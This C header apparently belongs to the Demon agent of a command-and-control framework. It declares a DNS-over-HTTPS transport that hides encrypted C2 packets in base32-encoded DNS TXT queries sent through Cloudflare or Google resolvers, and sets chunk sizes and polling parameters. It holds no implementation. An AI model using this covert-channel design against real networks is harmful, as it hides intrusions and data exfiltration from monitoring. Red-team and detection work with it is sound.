#ifndef DEMON_TRANSPORTDOH_H
#define DEMON_TRANSPORTDOH_H

#include <core/Win32.h>
#include <core/Package.h>

#include <windows.h>
#include <winhttp.h>

#ifdef TRANSPORT_DOH

/* Chunk sizing — matches Specter DoH wire format.
 * DNS labels are limited to 63 octets; we use 60 base32 chars per label,
 * which decodes to floor(60 * 5 / 8) = 37 bytes per chunk. */
#define DOH_CHUNK_B32_LEN  60
#define DOH_CHUNK_BYTES    37   /* floor(60 * 5 / 8) */
#define DOH_MAX_CHUNKS     1000

/* DNS RR type for TXT records. */
#define DOH_DNS_TYPE_TXT   16

/* Ready-poll backoff parameters (milliseconds). */
#define DOH_POLL_INIT_MS   500
#define DOH_POLL_MAX_MS    8000
#define DOH_POLL_MAX_ATTEMPTS  20

/* DoH provider identifiers (stored in config). */
#define DOH_PROVIDER_CLOUDFLARE  0
#define DOH_PROVIDER_GOOGLE      1

/*!
 * @brief
 *  Send a C2 packet via DNS-over-HTTPS and receive the response.
 *
 *  Encodes `Send` as base32 chunks embedded in DNS TXT query names,
 *  transmits them through a public DoH resolver (Cloudflare/Google),
 *  then polls for and reassembles the teamserver's response chunks.
 *
 *  Wire format is byte-for-byte compatible with Specter's DoH transport.
 *
 * @param Send  Buffer containing the encrypted C2 packet to transmit.
 * @param Resp  Output buffer for the response (caller frees via LocalFree).
 * @return TRUE on success, FALSE on transport failure.
 */
BOOL DoHSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
);

#endif /* TRANSPORT_DOH */

#endif /* DEMON_TRANSPORTDOH_H */
